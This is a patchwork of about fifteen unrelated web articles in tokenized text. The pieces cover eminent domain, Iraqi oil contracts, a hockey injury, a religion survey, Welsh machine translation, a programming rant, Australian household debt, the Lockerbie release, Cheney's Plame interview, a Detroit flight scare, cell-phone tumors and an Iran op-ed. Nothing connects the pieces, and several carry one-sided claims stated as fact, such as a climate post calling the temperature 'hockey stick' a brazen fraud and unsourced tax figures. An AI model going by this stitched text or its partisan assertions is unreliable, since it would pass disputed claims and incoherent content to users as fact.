It is n’t an accident that the term Eminent Domain translates directly to Supreme Lordship ( from the original Latin dominium eminens ) .
Such power stems from the very core of national socialist mentality , that private interests must always yield to greater social need .
Notwithstanding this socialist presumption , the application of which could still follow an honest purpose , the problem is not so much one of actual social need , but rather who gets to interpret what society is in need of , and whether society , ostensibly , will be served by seizure of private lands , to be disposed of in any way expedient to the government .
When such questions are unilaterally determined by a seizing power , well . . several cliche ’s come to mind – the liquor store run by the alcoholic , fox guarding the hen - house , absolute power corrupts absolutely .
( A typical case study : the Village of North Hills in Nassau County eye - balling the Deepdale Golf Course , with the intent of municipalizing it for the exclusive use of village residents .
The mayor said this would increase the property values of its exclusive homes , already worth millions , and that the town will benefit from the property tax increases .
Interestingly , North Hills does n’t have a firehouse , a library , or even a school for its residents ’ public use . )
But in the Kelo case , it may appear that this total evisceration of private property rights , could have an ancillary silver lining , if only by virtue of the naked , presumptive , audacity of it all .
Whereas most Americans generally ignore the political process , and may only have a passing idea of current Supreme Court cases , this one seems to have struck a nerve .
It seems to have united an overwhelming majority of the people and politicians toward the quotidian libertarian attitude about this practice ; strangely because in most other socio- governmental arenas Americans on the whole have swallowed and accepted the Demopublican party line , insofar that you must ultimately sacrifice personal liberties and properties for the good of society .
Although in public debates we find many complaints about the evisceration of personal liberties , we rarely see the public actually vote out of office the very legislators and jurists that effect the loss of those liberties .
This is a result of the public ’s daily discomfort level still clocking in lower than their natural tropism to vote as they always have , due to tribalism and inertia .
People simply do n’t vote on idealism , they vote first with their emotions , then with their personal inertia , then with their tribe .
Even when their personal liberties are culled , unless they feel it directly , it has very little effect on their voting habits .
( It has been said that serfs of the middle ages would revolt when taxes began to exceed 10 % .
An interesting factoid , considering that modern Americans pay over 40 % of their income in taxes . )
Eminent domain abuse is what sparked the ire of the American people , so strongly so that politicians have had to grit their teeth , gone against their power snaffling , socialist grain , and forced themselves to align with a populist rally .
Despite its onerous reincarnation since 1953 , Eminent Domain abuse is again a hot button topic that most politicians now bellow about .
Statutory bills have since been instituted in many states banning the seizure of private property for the use of “ economic development ” , and other states are considering voting such prohibitions into their constitutions .
In US Senate , a bill entitled “ Protection of Homes , Small Businesses , and Private Property Act of 2005 ” ( the PoHSBaPP Act ? ) had been introduced , to limit the use of Eminent Domain for economic development from the federal government , and also upon the States ( via that time tested federal coercion tool – withholding federal funding to states who refuse to play ball . )
Similar bills have been put before the Congress as well .
Even former POTUS Bush issued and executive order curtailing some of the newfound powers the Supreme Court permitted .
Some private institutions have jumped into the sway ; BB&T Bank announced that it refuses to lend money to commercial developers that intend to build upon land that has been taken away from private citizens via Eminent Domain proceedings .
Many critics contend that most of these initiatives are window dressing , leaving gaping holes in their prohibitions that effectively leave the worst kind of discretion intact .
It is as if , like an overcontrolling parent , the law makers just ca n’t nip their umbilical cord of control , and let their adult children live their own lives .
To libertarians , of course , Eminent Domain is always abuse , for such activity strikes to the very core of libertarian precepts .
It is perhaps the most bluntly socialist power retained by the government as a constitutionally protected act .
This is made all the more abusive , when what passes for due process , is actually the legally sanctioned whim of governmental apparatchiks .
Libertarians vest first rights of property on the individual , and no other entity has the option to supersede those rights ; it is only through voluntary negotiations or debt resolutions that a person ’s property can be taken from him / her .
Curiously , in light of the public ’s reaction , legislators have proposed another Amendment to the Constitution that makes explicit these expected limitations of Eminent Domain ; considering that the original Amendment ( 5th ) already makes explicit these limitations , this is almost comical .
But burdened by the rapacious interpretations of the Supreme Court , it may necessitate a redundant “ No , Really ” Amendment saying the same damn thing : “ Public use means PUBLIC . . . USE ! ” .
One can only hope that similar outrages will reach a critical mass , that Americans en bloc will wake up from the Demopublican stupor they have been Sirened into , and begin to see the light of liberty recognized and coveted by libertarians .
It is only then that society and government will respect and protect the personal sovereign rights of private property and of personally retained liberties .
The plunder of Iraq ’s oil
11 November 2009
The awarding of development rights over the huge West Qurna oilfield in southern Iraq to Exxon - Mobil and Royal Dutch Shell last Thursday once again underscores the criminal character of the continuing US - led occupation .
As the direct result of the Iraq war , major American and other transnational energy conglomerates are now gaining control over some the largest oilfields in the world .
West Qurna has proven reserves of 8.7 billion barrels of oil .
Iraq ’s total reserves are currently put at 115 billion barrels , though dozens of potential fields have not been explored adequately .
Before the US invasion in 2003 , rights over West Qurna had been awarded by the Baathist regime of Saddam Hussein to the Russian oil firm , Lukoil .
The pro-US puppet regime in Baghdad has torn up all pre-war contracts .
Exxon - Mobil is the first US - based oil giant to benefit .
Under the terms of a 20 - year contract , Exxon - Mobil and Shell plan to boost daily production at West Qurna from less than 300,000 barrels to 2.3 million barrels per day over the next six years .
As well as the Iraqi government compensating the companies for the cost of upgrading the field — which may run as high as $ 50 billion — they will be paid $ 1.90 for each barrel extracted , or some $ 1.5 billion per year .
Exxon - Mobil holds an 80 percent stake and Shell the remaining 20 percent .
The contract is only the second signed by the Baghdad regime with foreign energy companies .
Last Tuesday , the Iraqi government concluded a deal with British Petroleum ( BP ) and China National Petroleum Corp ( CNPC ) , giving them development rights to the massive Rumaila field and its reserves of 17 billion barrels .
BP holds a 38 percent stake and CNPC , a 37 percent share .
The plan is to boost production from around 1 million barrels per day to 2.85 million barrels , generating profits of over $ 2 billion per year .
The only disappointment for the transnationals is that the contracts are not based on the Production Sharing Agreement ( PSA ) model , which gives access to as much as 40 percent of an oilfield ’s total revenue .
Even the venal elements that make up the Iraqi government rejected handing over the country ’s largest oil fields on such terms .
Instead , the deals are classified as “ service ” agreements .
This has enabled Prime Minister Nouri al - Maliki and his oil minister , Hussain al - Shahristani , to ignore parliament and the lack of a hydrocarbons law to govern the energy industry .
Further deals are in the process of being finalised .
A consortium made up of the Italian company Eni , US - based Occidental and South Korea ’s Kogas has signed a tentative agreement for the Zubair oilfield with reserves of 4 billion barrels .
Eni , Japanese giant Nippon Oil and Spanish firm Repsol are bidding for a field in Nasiriyah which has similar - sized reserves .
In northern Iraq , Royal Dutch Shell is negotiating a contract to develop untapped areas of the major Kirkuk oilfield , which is thought to have as much as 10 billion barrels in reserves despite being in production since 1934 .
After initially demanding better terms , the energy companies are agreeing to deals to upgrade existing fields in the hope that they will better positioned when more lucrative contracts , on the PSA model , over 67 untapped fields are auctioned later this year or next year .
While it has taken far longer than anticipated , the major energy conglomerates now calculate that Iraq is now sufficiently stable to begin pouring in money to vastly expand the country ’s oil production .
The first step has been taken in opening up the Iraqi oil industry , which was nationalised in 1975 , to foreign investors .
Highlighting the neo-colonial nature of this operation , two former top American officials under the Bush administration are now facilitating corporate deals in Iraq .
Jay Garner , the first head of the US occupation administration in Iraq following the invasion , is an advisor to the Canadian energy company Vast Exploration , which has a 37 percent stake in an oilfield in the Kurdish north .
Zalmay Khalilzad , former ambassador to Afghanistan , Iraq and the UN , has established his own corporate consultancy firm in the Kurdish city of Irbil .
The US invasion and occupation of Iraq was always a war over energy resources .
Over one million Iraqis have been slaughtered , millions more people maimed and traumatised , cities and infrastructure destroyed and tens of thousands of American soldiers killed or wounded to achieve American domination of Iraq ’s vast oil reserves as part of its broader ambitions in the Middle East and Central Asia .
The US failed to achieve its wider regional objectives after the first Gulf War in 1990 - 91 .
The Hussein regime remained in place and despite continued UN sanctions was signing contracts with companies such as French oil giant Total and Lukoil .
From the late 1990s on , Russia and the European powers were pressing for the lifting of sanctions to allow these companies to reap the benefits .
War became the only means of preventing US corporate interests from being cut out .
American energy conglomerates were not passive bystanders .
High - level representatives of Exxon - Mobil , Chevron , Conoco - Phillips , BP America and Shell took part in talks in early 2001 with the Bush administration ’s “ Energy Task Force ” headed by Vice President Dick Cheney .
One document prepared for the discussions included a detailed map of Iraq ’s oil fields , terminals and pipelines and a list of the non-US foreign companies that were preparing to move in .
A May 2001 report by the task force bluntly stated the US aim : “ The Gulf will be the primary focus of US international energy policy . ”
The September 11 , 2001 terrorist attacks were seized upon to provide a pretext for war .
The lies over Iraqi weapons of mass destruction were entwined with further lies about an Iraqi link to Al Qaeda .
In the lead - up to the invasion , oil industry executives repeatedly met with Bush administration officials .
As the Wall Street Journal commented on January 16 , 2003 : “ US oil companies are starting to prepare for the day when they may get a chance to work in one of the world ’s most oil - rich countries . ”
Having drowned the Iraqi people in blood , the American financial and corporate oligarchy now believes that day has finally arrived .
While US corporations are not the sole beneficiaries of the contracts , there is no question who has the final say over Iraq ’s oil .
With huge military bases in the country and a Baghdad regime tied to Washington , the US is positioned to dictate terms to its European and Asian rivals and , amid rising great powers tensions , to wield the threat of cutting off oil supplies — a longstanding tenet of American strategic policy .

Alex Ovechkin , the best hockey player in the world , left the game this evening with a knee injury .
The injury appears to be serious , as Alex was not able to put any weight on the injured right knee when skating off the ice .
The injury occurred during the first period , in a knee on knee collision with Carolina ’s Tim Gleason .
Ovechkin was penalized for the play , receiving a five - minute major penalty and a game misconduct .
This is the second time that Ovechkin has been injured this season , and also his second game misconduct in the past 3 games .
He missed 6 games to begin November , with an undisclosed upper body injury , and he was sent to the locker room early against Buffalo for a high hit the day before Thanksgiving .
The Capitals are not commenting on Ovechkin ’s status this evening , but should have a vague report tomorrow .
Media Molecule have finally listened .
New trophies have just appeared for the game , indicating a follow - up to the epic Metal Gear Solid DLC Level Pack .

America is a melting pot not only of culture but also religion , according to a survey released Wednesday .
Many Americans attend services outside of their own religion , and blend Christianity with Eastern and New Age beliefs , the Pew Research Center ’s Forum on Religion & Public Life said .
The nationwide poll of 4,013 adults found that a third regularly or occasionally attended religious services at more than one location -- and 24 % of the public overall worshiped outside their faith .
Three in 10 Protestants surveyed said they sometimes attended services representing other faiths , as did about 20 % of Roman Catholics .
S. Scott Bartchy , a professor of the history of religion at UCLA , said the results were not surprising given the increasing cultural diversity of the United States .
“ Once people become acquainted with various religions , it ’s easy to mix and match , ” he said .
Bartchy also said technology , such as the Internet , played a role in observing multiple religions .
“ The great thing is , as an individual you can go online and get all kinds of ideas .
You can go online and put it together yourself . ”
About a quarter of those surveyed expressed beliefs in New Age or Eastern religious principles such as reincarnation and the presence of spiritual energy in physical objects .
“ People have talked about many Americans in the mainstream seeing themselves as being on a spiritual journey , ” said Paul Lichterman , a professor of sociology and religion at USC .
He said that over a lifetime , more Americans will try out different religions than will stay true to one faith .
The number of Americans who said they had interacted with a ghost had doubled over the last 13 years , from 9 % to 18 % , the survey found .
About 65 % of those surveyed also expressed belief in or report having an experience with a variety of supernatural phenomena , such as believing in astrology , being in touch with the dead or consulting a psychic .
Regardless , Lichterman said , Americans have the idea that religion and spirituality are a matter of choice .
“ That kind of religious individualism , ” he said , “ is the American religion . ”

Flummoxed by a document in Welsh ?
Now you can get a free translation at cymraeg.org.uk .
The Apertium - cy software , described as the first free automatic translator from Welsh to English , is the fruit of a multilingual effort involving developers in Spain , Wales and Ireland pushing forward the possibilities of open - source software and , they hope , free public - sector data .
Apertium-cy is the first non-Romance language to be available on Apertium , a machine - translation platform developed by the Transducens research group at the University of Alicante and a spin - off , Prompsit Language Engineering .
It already offers 14 pairs of languages , plus the possibility of creating translators for new combinations .
Work on the Welsh - language version was led by Francis Tyers and Kevin Donnelly .
It contains about 10,000 words in Welsh and English and 150 grammatical rules - enough to get the gist of the text , the developers say .
The idea is to provide an easy way for people who do n't speak Welsh to keep an eye on Welsh - language media reports in an area of interest , and to provide a " first - pass " translation of documents , improving the productivity of human translators .
Open source is important to the project because it enables a community of users continuously to improve the software .
So far , so good .
However the developers are worried that the next stage of the project might involve re-inventing the wheel , in the shape of a list of modern Welsh words .
Such lists already exist , compiled by the government - funded Welsh Language Board , but Donnelly says that the licensing terms look daunting .
" It says you can only download for use on a single PC , or a single network , " he says .
He worries that the team may now have to compile its own dictionary .
" It seems a little pointless when the Welsh Language Board has already paid to have it done , and has a mission to disseminate it as widely as possible . "
Ironically , the developers got hold of their English word list from an official database in Spain .
When we contacted the Welsh Language Board , however , it said the Apertium team could n't be more wrong .
" We welcome re-use , " it said .
Although the small print forbids unauthorised reproduction , the board says it would be delighted to consider requests .
Where feasible , it will make products available under what it says would be " a suitable free non-commercial agreement " .
That looks like good news , and reflects growing international practice .
The European Commission , for example , has promised to make its translation database , which contains 1 m in 23 different language combinations , available for re-use .
We wonder if the Foreign and Commonwealth Office has its own linguistic treasure chest , just waiting to be opened .

This is kind of a semi rant so if you do n’t like to read those kind of things feel free to skip this post .
How much math does a programmer need to know to do his job ?
These days with all the frameworks that exists you do n’t need to know how to do a square root , a power function or a quick sort these will likely already be built in .
What perplexes me is that someone would come out with a function to flip a sign .
So if the number is 5 make it - 5 and if it is - 5 make it 5 .
Is n’t this simple math ?
Multiply by - 1 and you are done !!
Take a look at this function that someone created on StackOverflow
Math opposite sign function ?
Does such function exist ?
I created my own but would like to use an official one :
private function opposite ( number : Number ) : Number { if ( number < 0 ) { number = Math.abs ( number ) ; } else { number = - ( number ) ; } return number ; }
If we visit the Java forums it does n’t get any better , take a look at this thread :
How do you Invert signed numbers ?
Hi there .
A simple question : How can I invert the sign of an integer ? ie ) convert - 12 to +12 ?
No doubt there is a really simple way to do this , but I ’m stumped , I cannot find anything and I ’ve been working on this program all day .
I ’ll be very grateful to anyone who can let me know if Java provides a way to do this , or point me in the right direction if it takes some tweaking of binary numbers using the Math package or something .
Cheers !
Here is one ‘ solution ’
int x = numberToInvertSign ; boolean pos = x > 0 ; for ( int i = 0 ; i < 2*Math.abs( x ) ; i++) { if ( pos ) { numberToInvertSign --; } else { numberToInvertSign ++ ; } }
You have to love this ‘ gem ’ ( of course this is someone messing with the original poster )
switch ( i ) { case 1 : return - 1 ; case 2 : return - 2 ; case 3 : return - 3 ; // ... etc , you get the proper pattern }
Looking at the php documentation for the ABS function we find a bunch of comments and replies to create a sign function
Is n’t this just basic math that was taught to us in grammar school ?
Of course it does n’t stop here , how many people these day can convert numbers between hexadecimal ( base - 16 ) , binary ( base - 2 ) and decimal ( base - 10 ) without using a tool ?
Of course the future is that people will rely more and more on frameworks and wizards , this could be bad if you need to fix something in your code .
Take a look at jQuery , people just love this because JavaScript is hard and they do n’t have to deal with it … the tool shields them from that .
Another example is ORM …. people hate writing queries and just want to create some classes and then some tool will spit out all the CRUD code for them .
Sometimes these tools produce some bad SQL and it takes a effort to figure out why your calls to the DB are suddenly slow
Enough ranting for the day … .
What do you think is it inexcusable that a programmer does not know that you can flip a sign by doing the following
return - number
or
return number * - 1

Eugene Robinson – Dick Cheney 's lies about President Obama – washingtonpost.com
Excellent demolition of Dick Cheney ’s shameful attack on the president in the wake of the Detroit attempted attack .
Cheney wanted to use the nonsensically phrased ‘ war on terror ’ as a wedge to destroy the Bill of Rights and permanently undermine the US constitution , and is annoyed that all the groundwork he laid for the return of rightwing monarchy has been sensibly tossed aside by the constitutional lawyer who succeeded him .
All this is not to mention that there can be more or fewer Muslims radicalized and that no one made America more vulnerable to attack than Cheney :

Australian households are in record levels of debt and , for the first time , have surpassed American levels .
Reserve bank figures show household debt - the combination of personal and mortgage debt - is equivalent to Australia 's GDP .
That means every adult owes an average of $ 74,000 .
Analysts warn that the financial crisis that rocked Main Street in America could well hit Australian families in 2010 .
Economics Professor Steve Keen at the University of Western Sydney says it is a sign that families are under financial stress .
" We now have an enormous proportion of income that has to be devoted to paying back interest payments , " he said .
" Even if you leave aside the interest payment fact , if you want to reduce your debt now where it would have taken you on average for Australians back in 1990 it would have taken just a few months , now it would take them a year to get back down to the zero mark . "
The Australian Council of Social Service says there is already a debt crisis and it will only get worse unless the Federal Government steps in , with the numbers of new families asking charities for help set to increase next year .
The council 's director , Alison Peters , says the Government needs to boost its support .
" We think there needs to be more support given to organisations like local neighbourhood centre like the major charities to be able to assist those people who are really desperate for assistance , " he said .
" A number of our organisations have already reported to us and indeed to the Government that they are seeing not only new families coming forward seeking assistance but many families are coming back again and again for assistance because they really are struggling . "

LONDON — Abdel Basset Ali al - Megrahi , the only person ever convicted of the bombing of flight Pan Am 103 , was released from a Scottish prison Thursday .
The announcement was made by Scotland 's Justice Minister , Kenny MacAskill .
MacAskill said he was releasing Megrahi on " compassionate grounds . "
The convicted man has terminal prostate cancer and the current prognosis of his survival is three months or less .
The justice minister told reporters the Scots " are a people who pride ourselves on our humanity . "
He added : " We believe justice be served but mercy be shown . "
The decision was made in the face of intense private and public pressure from senior U.S. officials .
Secretary of State Hillary Clinton lobbied against the release right up to the last minute .
She told reporters yesterday , " It is inappropriate .
I am very much against it .
I take this very personally .
I think it is absolutely wrong . "
Last week , six U.S. senators including John Kerry and Ted Kennedy sent a letter to MacAskill demanding that Megrahi remain in prison .
The decision is just the latest moment of controversy in a two decades long saga .
Pan Am 103 was blown out of the skies over Lockerbie Scotland on Dec. 21 , 1988 .
All 259 people aboard the plane and 11 on the ground were killed .
Most of the victims were either American or British , and over the years a split has developed between the two sides over the way justice should be pursued .
The split comes from two very understandable needs of the victims ' families : the need for punishment and the need for truth .
In this case these needs were in conflict .
Most of the American families wanted punishment .
Susan Cohen , whose daughter died in the atrocity , told the BBC last week , " Any letting out of Megrahi would be a disgrace .
It makes me sick , and if there is a compassionate release then I think that is vile . "
Her view is typical among American families .
But Dr. Jim Swire , a Briton who also lost a daughter , believes Megrahi is innocent .
" Two wrongs do n't make a right , " he told the BBC .
" The horror of Lockerbie plus the horror of this man dying away from his family do n't make one right . "
Swire , heads the group representing victim families in Britain .
Over the years , the retired physician has become a lightning rod for the anger of victims ' families in the U.S.
He is acutely aware of the distress his views cause .
" I do n't want to make life worse for those who lost family members but forgive me , I want the truth . "
The Lockerbie case is a paradigm of the wise old saw , " justice delayed is justice denied . "
It took more than a decade to investigate the crime , accuse Megrahi and one other Libyan , Lamin Khalifah Fhima , of perpetrating it and then bring them to trial .
At every stage of the process there were enough gaps in the facts made public to inspire not just the usual gaggle of conspiracy theorists — people who think that every nefarious event in the world is either the work of the Mossad or governments in thrall to the oil industry — but more thoughtful people who do not see the puzzle fitting together and who ask , not unreasonably , if Megrahi is a fall guy does n't that mean the real criminals are walking free ?
A quick summary of the case :
Initial suspicion for the crime fell on the Iranian government .
It had motive :
In the summer of 1988 , an American warship , the USS Vincennes , on patrol in the Persian Gulf had blasted an Iranian civilian airliner out of the sky killing 290 people .
Ayatollah Khomeini had vowed revenge .
It was believed that the job was contracted out to a radical Palestinian faction in Syria .
For more than a year this was the theory of the crime and FBI investigators were happy to leak the theory to the press .
Two years later , the theory changed .
A scrap of clothing found at the site of the disaster , believed to have been in the suitcase which contained the bomb was traced to a store in Malta .
The store 's owner , identified Megrahi as the purchaser of the clothing .
Megrahi worked for Libyan airlines in Malta .
The theory now shifted , Megrahi had put the bomb in a suitcase on a plane in Malta bound for Frankfurt .
In Frankfurt , the suitcase was put on a Pan Am flight 103A to London , there the bag was transferred on to Pan Am 103 to New York .
Libya 's motive for the attack was not clear .
Warrants were issued for Megrahi's and Fhimah 's arrest in 1991 .
It would take six years and a change of British government before Nelson Mandela was able to broker a deal between the new British prime Minister , Tony Blair , and Libyan dictator Moammar Gadhafi that led to this agreement : the pair would be sent for trial in a neutral country under the rules of Scottish law ( the Scottish legal system has historically been different from that of England and the rest of the UK ) .
The neutral country agreed was the Netherlands .
The two Libyan men were handed over to authorities there in late 1999 and the trial began in February 2000 .
A year later Megrahi was convicted , his co-defendant found innocent .
But that would never be the end of the story .
Megrahi appealed his conviction .
The appeal was denied .
He then applied for a judicial revue , this was a more successful maneuver .
New facts came to light .
Exculpatory evidence — a break - in at Heathrow airport the night before Pan Am 103 took off — was withheld from the defense .
His lawyers claimed that it was possible the bomb was planted during the break - in .
In 2007 , Megrahi was granted leave to appeal a second time .
Meanwhile other aspects of the case were resolved .
Libya agreed to pay compensation of around $ 8 million to each family .
In return the U.N. removed all sanctions from Libya .
Gadhafi began a rapid process of rehabilitating his nation from being a pariah to a key supplier of oil to the west .
In 2007 , in one of his final acts as prime minister , Tony Blair went to Libya to meet with Gadhafi and signed a memorandum , a Prisoner Transfer Agreement , at around the same time British Petroleum entered into a long - term multi-billion dollar with the Libyan National Oil company to develop Libya 's massive oil reserves .
Other things changed as well .
Tony Blair campaigned on a platform of devolving power to Scotland .
Following his victory in the 1997 election , Scotland was allowed to form a government with its own parliament .
Scottish nationalist politics began to muddy the waters .
In June 2007 , the Scottish National Party won a majority of seats and formed a government for the first time .
Scotland 's First Minister , Alex Salmond is a nationalist and he expressed anger at the time that Blair had in effect committed the Scottish government to transferring Megrahi at some point in the future .
Salmond saw that as an infringement of Scottish sovereignty .
Today , MacAskill said the Libyan government had indeed made an application for Megrahi 's transfer under the agreement .
He rejected that request .
In a final twist of the story , Megrahi dropped his appeal earlier this week .
Under Scottish law he could not be released while there were legal proceedings underway .
Swire and others had hoped that in the appeal court new evidence would come out that would bring the truth of what happened closer .
So now Megrahi is en route to Libya and there is bitter disappointment for those who sought punishment and those who sought truth .
He will die in Libya surrounded by his family and friends .
He will take his secrets to the grave with him and the government of Libya will be under no compulsion to make public what it knows .
The only way forward now would be for the British and American governments to tell us what they know — or hold a further public review of events .
Justice Minister MacAskill , acknowledged today , " There are questions to be asked and answered about the case but they are beyond the jurisdiction of the Scottish government . "
He added Scottish authorities would be willing to assist in answering those questions .
But it is unlikely that the American and British governments will ever get around to asking them .
From Jo Nova a look at how the MWP looks when other data is used , not just a few trees in Yamal .
These maps and graphs make it clear just how brazen the fraud of the Hockey Stick is .
Click to enlarge
It ’s clear that the world was warmer during medieval times .
Marked on the map are study after study ( all peer - reviewed ) from all around the world with results of temperatures from the medieval time compared to today .
These use ice cores , stalagmites , sediments , and isotopes .
They agree with 6,144 boreholes around the world which found that temperatures were about 0.5 °C warmer world wide .
What follows is a sordid tale of a graph that overthrew decades of work , conveniently fitted the climate models , and was lauded triumphantly in glossy publication after publication .
But then it was crushed when an unpaid analyst stripped it bare .
It had been published in the highest most prestigious journal , Nature , but no one had checked it before or after it was spread far and wide .
Not Nature , not the IPCC , not any other climate researcher .
In 1995 everyone agreed the world was warmer in medieval times , but CO2 was low then and that did n’t fit with climate models .
In 1998 , suddenly Michael Mann ignored the other studies and produced a graph that scared the world — tree rings show the “ 1990 ’s was the hottest decade for a thousand years ” .
Now temperatures exactly “ fit ” the rise in carbon !
The IPCC used the graph all over their 2001 report .
Government departments copied it .
The media told everyone .
But Steven McIntyre was suspicious .
He wanted to verify it , yet Mann repeatedly refused to provide his data or methods — normally a basic requirement of any scientific paper .
It took legal action to get the information that should have been freely available .
Within days McIntyre showed that the statistics were so flawed that you could feed in random data , and still make the same hockey stick shape nine times out of ten .
Mann had left out some tree rings he said he ’d included .
If someone did a graph like this in a stock prospectus , they would be jailed .
Astonishingly , Nature refused to publish the correction .
It was published elsewhere , and backed up by the Wegman Report , an independent committee of statistical experts .
In 2009 McIntyre did it again with Briffa ’s Hockey Stick .
After asking and waiting three years for the data , it took just three days to expose it too as baseless .
For nine years Briffa had concealed that he only had 12 trees in the sample from 1990 onwards , and that one freakish tree virtually transformed the graph .
When McIntyre graphed another 34 trees from the same region of Russia , there was no Hockey Stick .
The sharp upward swing of the graph was due to one single tree in Yamal .
Skeptical scientists have literally hundreds of samples .
Unskeptical scientists have one tree in Yamal , and a few flawed bristlecones …
…
Climate models do n’t know why it was warmer 800 years ago .
The models are wrong .
The so - called “ expert review ” is meaningless .
The IPCC say 2,500 experts review their reports , but those same “ experts ” made the baseless Hockey Stick graph their logo in 2001 .
Craig Loehle used 18 other proxies .
Temperatures were higher 1000 years ago , & cooler 300 years ago .
We started warming long before cars and powerstations were invented .
There ’s little correlation with CO2 levels .

Notes from former Vice President Dick Cheney ’s interview with the FBI about the leak of Valerie Plame Wilson ’s covert CIA identity were finally released on Friday afternoon after a lengthy legal battle .
Citizens for Responsibility and Ethics in Washington sued the Justice Department last year to obtain the interview notes ; a judge finally ordered their release on October 1 .
In the interview , Cheney demonstrated a behavior common among Bush administration officials under investigation : he could n’t remember much of anything .
Here ’s a non-comprehensive list of 22 things Dick Cheney claimed he could n’t recall about the Plame case , in the order they appear in the FBI ’s notes :
Whether the Wilson trip was discussed during any of the visits he made to the CIA with his Chief of Staff , Scooter Libby .
Any reaction he had to Nicholas Kristof ’s New York Times ‘ article about the Wilson visit at the time the article was published .
Whether he discussed the Wilson situation with George Tenet at their meeting on June 10 , 2003 .
Who he spoke to about Joe Wilson ’s July 6 , 2003 editorial ( he did remember speaking to someone , but not who it was ) .
What happened to the Joe Wilson op - ed after he wrote on it suggesting that Valerie Plame Wilson had sent Joe Wilson on a “ junket , ” and put it in his outbox .
Any specific advice he gave his press people in the May - June 2003 timeframe regarding the Wilson trip to Niger .
Whether he discussed the Wilson situation with Eric Edelman , one of his national security advisers .
Whether Cathie Martin , his press secretary , entered his office while both he and Scooter Libby were present and advised both of them that Joe Wilson ’s wife was employed by the CIA .
Discussing Joe Wilson or Wilson ’s wife with his former press secretary Mary Matalin , although he said it was possible .
Ever discussing Valerie Plame Wilson with Libby prior to the publication of Novak ’s column .
Whether Scooter Libby knew about Valerie Plame Wilson on July 12 , the day before the publication of the Novak column .
If Libby ever told Cheney he had independent knowledge of Valerie Plame Wilson ’s covert identity
Dictating notes to Libby on July 12 , 2003 that Cheney said looked and sounded like something he might have dictated to Libby .
Discussing the Novak column or any of its contents with anyone at the time it was published .
Whether he discussed the Wilson trip with Libby as a sort of “ boondoggle ” or “ junket , ” although he believed it possible that he had such a conversation .
If Libby told him that Libby was not Novak ’s source .
Libby telling him how he first learned that Valerie Plame Wilson was a covert CIA operative .
Whether he told Libby that Valerie Plame Wilson was a covert CIA operative .
Waving off Libby when Libby offered to tell him everything he knew about the Wilson matter .
Anyone on his staff , including Libby , ever meeting with Judith Miller during the week of July 7 , 2003 .
Having a conversation with Libby during which Libby said he wanted to share the judgments of the National Intelligence Estimate with Judith Miller .
Whether Libby told him that certain material in the NIE had to be declassified before it could be shared .
For an interview conducted around a year after the events in question , the Vice President seems to have forgotten a lot , including one very crucial detail : whether he told Libby about Valerie Plame Wilson .
DETROIT ( Reuters ) -
When the first emergency alert from Detroit ’s airport went out just before noon on Sunday , it looked oddly like a mistaken repeat of the scare from two days earlier : “ Nigerian national caused disturbance on Flight 253 . ”
As the Airbus 330 approached Detroit after a nine - hour flight from Amsterdam , a Nigerian who was sitting in the plane ’s last row locked himself in the bathroom and refused to come out even when the flight crew ordered him to do so .
On Friday , another Nigerian man , Umar Farouk Abdulmutallab , was accused of trying to ignite an explosive on the same Delta Airlines flight to Detroit .
“ My first reaction was that someone had hit the send button on the same message by mistake , ” Michael Conway , a spokesman for Detroit Metro Airport , recalled thinking when he saw the first emergency alert on a pager .
After Friday ’s incident , U.S. - bound passengers have faced tighter security measures , including pat - downs and an order to stay seated during the last hour of their flight .
The Nigerian man on Sunday ’s flight , who was not identified , was released after FBI agents determined he was genuinely sick and not involved in any plot against the plane .
But passengers among the 275 other people on board faced a tense wait while officials conducted interviews , bomb - sniffing dogs pored over luggage emptied onto an icy tarmac and police cordoned off the plane on a remote part of the airport .
After landing in Detroit , the Nigerian man was led out in handcuffs by FBI agents while police with automatic weapons surrounded the Northwest plane , passengers said .
“ Everybody was scared , freaked out .
We were all just shaking , ” said Niranjanar Kumar , who was flying back to his home in Michigan after a visit to Delhi .
Other passengers said they had no indication of anything unusual until the plane approached Detroit .
At that point , two undercover air marshals identified themselves and went to the rear of the plane to join the flight crew outside the bathroom , several passengers said .
Passengers were taken in six buses to a large waiting area of the Detroit airport and barred from using cellphones while all the baggage was searched .
Some of the travelers were interviewed .
“ It took four hours for them to decide what to do with us , ” said Ken Raub , a Detroit - area resident returning from Moscow where he and his wife adopted a baby girl .
“ It was a little rough . ”
FBI agents were still at the Detroit airport as part of a continuing investigation of the Christmas Day incident and joined customs , border patrol agents and airport police and fire crews in responding to the scare , officials said .
One flight attendant appeared to faint and was treated on the plane after it landed , said Jane Jeronimus , an Australian passenger who sat in business class .
Hitesh Desai , who was traveling from Bombay to Detroit , said he was unaware that anything was unusual until the plane landed and he saw all the police waiting .
“ This was just a normal flight , ” he said .
“ It did feel kind of surreal while it was happening . ”
The Institute of Environmental Medicine at the Karolinska Institutet in Stockholm said Thursday that it has found that 10 or more years of cell phone use may increase the risk of acoustic neuroma , a noncancerous tumor , in humans .
Since digital handsets have not been in widespread circulation over that period , the researchers related their findings to analog phones alone .
According to the report -- based on a survey of about 150 people already diagnosed with acoustic neuroma and 600 healthy individuals -- the risk of developing the tumors almost doubled for those who began using a cell phone at least 10 years beforehand .
In addition , the Karolinska Institutet study contends that when the side of the head a person typically held their cell phone against was taken into consideration , the risk of acoustic neuroma was almost four times higher than normal .
The concept that wireless devices may increase the risk of brain cancer is one that has shadowed the communications industry since at least the mid-1990s , when cell phones grew more popular .
However , there have been few studies that offer hard proof that a relationship exists between wireless handset use and any illness .
The U.S. Food and Drug Administration has said previously that while mobile phones do emit electromagnetic radiation , the amount of energy dispersed by the devices is similar to that emitted by other common household devices , such as television sets and microwave ovens , and does not pose a measurable health risk .
Acoustic neuroma tumors typically affect the auditory nerve , which is connected to the brain , and grow slowly over a period of years before they are diagnosed .
On average , the tumors are found in less than one adult per 100,000 each year .
The New York Times published an op - ed today that calls for war against Iran .
Alan J. Kuperman , director of the Nuclear Proliferation Prevention Program at the University of Texas at Austin , argues that the unraveling of the uranium enrichment agreement proves that the United States must conduct air strikes on Iran ’s nuclear facilities to prevent the Islamic Republic from developing a nuclear weapon .
Kuperman ’s analysis is problematic for several reasons .
Here are two .
First , Kuperman cites the failure of the P5+1 uranium enrichment proposal as evidence “ that Iran , for domestic political reasons , cannot make even temporary concessions on its bomb program , regardless of incentives or sanctions . ”
Kuperman rejects out of hand the possibility that the Iranians simply did not view the P5+1 offer as promoting the Islamic Republic ’s national interest .
Second , Kuperman says that the United States could limit the Iranian response to a bombing campaign because , “ If nothing else , the wars in Iraq and Afghanistan have shown that the United States military can oust regimes in weeks if it wants to . ”
It is difficult to know where to begin here .
